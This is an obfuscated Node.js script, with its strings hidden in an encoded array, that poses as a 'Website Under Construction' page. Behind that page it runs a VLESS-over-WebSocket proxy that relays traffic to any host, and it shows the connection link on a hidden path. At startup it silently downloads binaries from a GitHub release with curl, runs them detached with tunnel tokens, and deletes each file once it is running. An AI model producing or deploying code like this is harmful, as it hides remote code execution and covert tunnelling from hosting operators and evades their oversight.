const _0x48ee=['net','unref','exit','cwd','readUInt8','connection','C_T','message','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','length','unlink','headers','write','host','split','https://github.com/seav1/dl/releases/download/files','chdir','now','OPEN','K_K','child_process','PORT','trim','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','K_S','/vl','slice','once','http','www.shopify.com','arm64','tmpdir','toString','http://','text/html','error','UUID','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>','readyState','arch','curl','/ko','&encryption=none&sni=','readUInt16BE','pipe','url','join','\x20-t\x20','connect','listen','C_B','every','map','application/json','chmod','-arm','service','\x20--disable-auto-update','createServer','end','&host=','C_D','writeFile','\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','writeHead','env','catch','stringify','ignore'];const _0x4ba2=function(_0x48ee11,_0x4ba2a7){_0x48ee11=_0x48ee11-0x0;let _0xef9668=_0x48ee[_0x48ee11];return _0xef9668;};const {exec,spawn}=require(_0x4ba2('0x14'));const {WebSocketServer,createWebSocketStream}=require('ws');const http=require(_0x4ba2('0x1c'));const {URL}=require(_0x4ba2('0x2d'));const net=require(_0x4ba2('0x0'));const {join}=require('path');const {promises:fs}=require('fs');const os=require('os');const CONFIG={'UUID':(process[_0x4ba2('0x42')][_0x4ba2('0x24')]||_0x4ba2('0x17'))['replace'](/-/g,''),'PORT':process[_0x4ba2('0x42')]['PORT']||0x1eb4,'K_S':process['env'][_0x4ba2('0x18')]||'','C_B':process[_0x4ba2('0x42')]['C_B']||_0x4ba2('0x1d'),'K_K':process[_0x4ba2('0x42')][_0x4ba2('0x13')]||'','C_T':process[_0x4ba2('0x42')][_0x4ba2('0x6')]||'','C_D':process['env']['C_D']||''};const FILE_NAMES={'ko':'worker','cf':_0x4ba2('0x38')};const isPortInUse=_0x33bd52=>new Promise(_0x53c9af=>{const _0x2a5832=net['createServer']();_0x2a5832[_0x4ba2('0x1b')]('error',_0x2ce89a=>_0x53c9af(_0x2ce89a['code']==='EADDRINUSE'));_0x2a5832[_0x4ba2('0x1b')]('listening',()=>{_0x2a5832['close']();_0x53c9af(![]);});_0x2a5832[_0x4ba2('0x31')](_0x33bd52);});const isProcessRunning=_0x53c689=>new Promise(_0x12805c=>{exec('pgrep\x20-x\x20'+_0x53c689,(_0x5a17e5,_0x24139b)=>_0x12805c(!_0x5a17e5&&_0x24139b[_0x4ba2('0x16')]()[_0x4ba2('0x9')]>0x0));});const fileExists=async _0x240628=>{try{await fs['access'](_0x240628);return!![];}catch{return![];}};const checkAndChangeWorkDir=async()=>{const _0x4214db=join(process['cwd'](),'.write_test_'+Date[_0x4ba2('0x11')]());try{await fs[_0x4ba2('0x3e')](_0x4214db,'test');await fs[_0x4ba2('0xa')](_0x4214db);return!![];}catch{process[_0x4ba2('0x10')](os[_0x4ba2('0x1f')]());return![];}};const vlessLink=()=>'vless://'+CONFIG['UUID']+'@'+CONFIG[_0x4ba2('0x32')]+':443?type=ws&path='+encodeURIComponent(_0x4ba2('0x19'))+_0x4ba2('0x3c')+CONFIG[_0x4ba2('0x3d')]+_0x4ba2('0x2a')+CONFIG['C_D']+'&fp=chrome&security=tls#'+CONFIG[_0x4ba2('0x3d')];const HTML_TEMPLATES={'home':'<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','status':(_0xe562fb,_0x101798)=>_0x4ba2('0x25')+_0xe562fb+_0x4ba2('0x8')+_0x101798+_0x4ba2('0x40')+_0x101798+_0x4ba2('0x3f')};const server=http[_0x4ba2('0x3a')]((_0x364cc6,_0x373889)=>{try{const {pathname}=new URL(_0x364cc6[_0x4ba2('0x2d')],_0x4ba2('0x21')+_0x364cc6[_0x4ba2('0xb')][_0x4ba2('0xd')]);if(pathname==='/'){_0x373889[_0x4ba2('0x41')](0xc8,{'Content-Type':'text/html'});_0x373889[_0x4ba2('0x3b')](HTML_TEMPLATES['home']);}else if(pathname==='/x'){_0x373889[_0x4ba2('0x41')](0xc8,{'Content-Type':_0x4ba2('0x22')});_0x373889['end'](HTML_TEMPLATES['status'](CONFIG['PORT'],vlessLink()));}else if(pathname==='/health'){_0x373889['writeHead'](0xc8,{'Content-Type':_0x4ba2('0x35')});_0x373889['end'](JSON[_0x4ba2('0x44')]({'status':'ok','uptime':process['uptime']()}));}else{_0x373889[_0x4ba2('0x41')](0x194,{'Content-Type':'text/plain'});_0x373889['end']('Not\x20Found');}}catch{if(!_0x373889['headersSent']){_0x373889[_0x4ba2('0x41')](0x1f4,{'Content-Type':'text/plain'});_0x373889[_0x4ba2('0x3b')]('Internal\x20Server\x20Error');}}});const wss=new WebSocketServer({'server':server,'path':'/vl'});wss['on'](_0x4ba2('0x5'),_0x20a655=>{_0x20a655[_0x4ba2('0x1b')](_0x4ba2('0x7'),_0x28225f=>{const [_0x227fdf]=_0x28225f;const _0x24454c=_0x28225f[_0x4ba2('0x1a')](0x1,0x11);if(!_0x24454c[_0x4ba2('0x33')]((_0x41f2f3,_0x368266)=>_0x41f2f3===parseInt(CONFIG[_0x4ba2('0x24')]['substr'](_0x368266*0x2,0x2),0x10)))return;let _0x3271b4=_0x28225f['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x1e8c5c=_0x28225f[_0x4ba2('0x1a')](_0x3271b4,_0x3271b4+=0x2)[_0x4ba2('0x2b')](0x0);const _0x47ec92=_0x28225f[_0x4ba2('0x1a')](_0x3271b4,_0x3271b4+=0x1)[_0x4ba2('0x4')]();let _0x5ae1d6;if(_0x47ec92===0x1){_0x5ae1d6=_0x28225f[_0x4ba2('0x1a')](_0x3271b4,_0x3271b4+=0x4)[_0x4ba2('0x2e')]('.');}else if(_0x47ec92===0x2){const _0x1f2dcc=_0x28225f[_0x4ba2('0x1a')](_0x3271b4,_0x3271b4+=0x1)['readUInt8']();_0x5ae1d6=new TextDecoder()['decode'](_0x28225f['slice'](_0x3271b4,_0x3271b4+=_0x1f2dcc));}else if(_0x47ec92===0x3){_0x5ae1d6=_0x28225f['slice'](_0x3271b4,_0x3271b4+=0x10)['reduce']((_0x1f065a,_0x2a9540,_0x349a27,_0x513b12)=>_0x349a27%0x2?_0x1f065a['concat'](_0x513b12[_0x4ba2('0x1a')](_0x349a27-0x1,_0x349a27+0x1)):_0x1f065a,[])[_0x4ba2('0x34')](_0x28c5a4=>_0x28c5a4['readUInt16BE'](0x0)[_0x4ba2('0x20')](0x10))['join'](':');}if(_0x20a655[_0x4ba2('0x26')]===_0x20a655[_0x4ba2('0x12')]){_0x20a655['send'](new Uint8Array([_0x227fdf,0x0]));const _0x23e420=createWebSocketStream(_0x20a655)['on'](_0x4ba2('0x23'),()=>{});const _0xe32fc1=net[_0x4ba2('0x30')]({'host':_0x5ae1d6,'port':_0x1e8c5c},function(){this[_0x4ba2('0xc')](_0x28225f['slice'](_0x3271b4));_0x23e420[_0x4ba2('0x2c')](this)[_0x4ba2('0x2c')](_0x23e420);});_0xe32fc1['on']('error',()=>{});}});});async function downloadAndRun(_0x229bbe,_0x408866,_0x52d516){if(!_0x229bbe)return;const _0x2face2=join(process[_0x4ba2('0x3')](),FILE_NAMES[_0x52d516]);if(await isProcessRunning(FILE_NAMES[_0x52d516]))return;if(await fileExists(_0x2face2)){await fs[_0x4ba2('0x36')](_0x2face2,0x1ed)['catch'](()=>{});spawnProcess(_0x2face2,_0x408866);return;}return new Promise(_0x1ef6c1=>{spawn(_0x4ba2('0x28'),['-s','-L','-o',_0x2face2,_0x229bbe],{'stdio':'ignore'})['on']('close',async _0x14aa43=>{if(_0x14aa43===0x0){await fs['chmod'](_0x2face2,0x1ed)['catch'](()=>{});spawnProcess(_0x2face2,_0x408866);}_0x1ef6c1();})['on'](_0x4ba2('0x23'),()=>fs[_0x4ba2('0xa')](_0x2face2)[_0x4ba2('0x43')](()=>{}));});}function spawnProcess(_0x578409,_0x2a35c1){const _0x1bdf71=spawn(_0x578409,_0x2a35c1[_0x4ba2('0xe')]('\x20'),{'stdio':_0x4ba2('0x45'),'detached':!![]});_0x1bdf71[_0x4ba2('0x1')]();_0x1bdf71['on']('spawn',()=>setTimeout(()=>fs['unlink'](_0x578409)[_0x4ba2('0x43')](()=>{}),0x3e8));}const baseUrl=_0x4ba2('0xf');const archUrl=_0x2bbceb=>process[_0x4ba2('0x27')]===_0x4ba2('0x1e')?_0x2bbceb+_0x4ba2('0x37'):_0x2bbceb;(async()=>{await checkAndChangeWorkDir();if(await isPortInUse(CONFIG['PORT']))process['exit'](0x1);server['listen'](CONFIG[_0x4ba2('0x15')]);await downloadAndRun(archUrl(baseUrl+_0x4ba2('0x29')),'-e\x20'+CONFIG[_0x4ba2('0x18')]+_0x4ba2('0x2f')+CONFIG[_0x4ba2('0x13')]+_0x4ba2('0x39'),'ko');await downloadAndRun(archUrl(baseUrl+'/cf'),'tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20'+CONFIG[_0x4ba2('0x6')],'cf');})()[_0x4ba2('0x43')](()=>process[_0x4ba2('0x2')](0x1));